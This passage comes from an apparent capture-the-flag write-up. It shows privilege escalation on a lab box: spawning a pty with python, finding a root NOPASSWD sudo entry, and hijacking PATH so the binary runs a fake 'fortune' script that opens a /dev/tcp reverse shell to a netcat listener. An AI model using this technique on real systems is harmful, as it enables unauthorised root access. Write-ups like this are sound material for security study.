<h3>the shortest straw</h3>

<p>I reran <code>auth_server</code> a few more times, and decided to push the binary through strings one more time, just to see if <em>maybe</em> the clue will be more clear now:</p>

<p>```bash auth_server Strings-ed</p>

Starting Auth server..
;*3$&ldquo;
```</p>

<p>This did not help me get what I was clearly missing, and so, I went back to the enumeration step. What do I know about my current environment? WHERE do I have access now? WHAT access do I have? Anything different here that I may be missing. Eventually, I tried to so a <code>sudo -l</code>, which should list the commands I am allowed to run with sudo. Because my shells were all build with netcat, I had no proper tty to work with, so, sudo would complain about this. A quick fix with python, and all is well again:</p>

<p>```bash jetta&rsquo;s sudo -l
[jetta@Relativity ~]$ sudo -l
sudo -l
sudo: sorry, you must have a tty to run sudo
[jetta@Relativity ~]$ python -c &ldquo;import pty;pty.spawn(&lsquo;/bin/sh&rsquo;);&rdquo;
python -c &ldquo;import pty;pty.spawn(&lsquo;/bin/sh&rsquo;);&rdquo;
sh-4.2$ sudo -l
sudo -l

<pre><code>(root) NOPASSWD: /home/jetta/auth_server/auth_serveyr
</code></pre>

<p>sh-4.2$
```</p>

<p>And there it is! <code>auth_server</code> may be run as root with no password requirement! \o/. Immediately I jumped to running <code>sudo /home/jetta/auth_server/auth_server</code>, just to be met with the same fate of &lsquo;error(12)&rsquo;. While playing with the binary earlier, I was however convinced that this error(12) thing was exactly what it was configured to do and nothing more. Yes, thats it. Simply write the &lsquo;Checking Certs&rsquo;, &lsquo;Contacting Server&rsquo; part, then, run <code>fortune -s | /usr/bin/cowsay</code> and error(12).</p>

<p>&hellip; wait a sec. <code>fortune</code> is not called from its full relative path, however /usr/bin/cowsay is. This means if I can fool the binary into thinking something else is this <code>fortune</code> command, then I may be able to root the box. Especially if I can make it think my bash shell is <code>fortune</code> :)</p>

<h3>finishing off</h3>

<p>With all the knowledge I have gained now, I moved on to finishing off by rooting the box. This was achieved by firstly creating a script called <code>fortune</code>, which was simply the old bash command pushed over /dev/tcp again, and placing it in <em>/home/jetta/bin</em>. I then ensured that <code>fortune</code> was executable and tested it by just running it alone. It was working fine :)</p>

<p>Next, I have to fool the auth_server binary to think that my new fortune script is in fact the one it was looking for. To do this, I added a path to the PATH env variable, and rehashed the bins. Lastly, I ran <code>auth_server</code> as root, and switched to my last nc listener on port 6677&hellip;</p>

<p>```bash auth_server Exploitation</p>

<p><code>@Relativity ~]$ python -c "import pty;pty.spawn('/bin/sh');"
sh-4.2$ export PATH=/home/jetta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
&lt;etta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin

sh-4.2$ sudo auth_server/auth_server
sudo auth_server/auth_server
[+] Checking Certificates...done
[+] Contacting server, please wait...could not establish connection
error: (12)
</code></p>

<p><code>auth_server</code> did its usual trick with error(12), however, my netcat listener now had a root prompt \o/</p>

<p>```bash root shell and flag.txt</p>
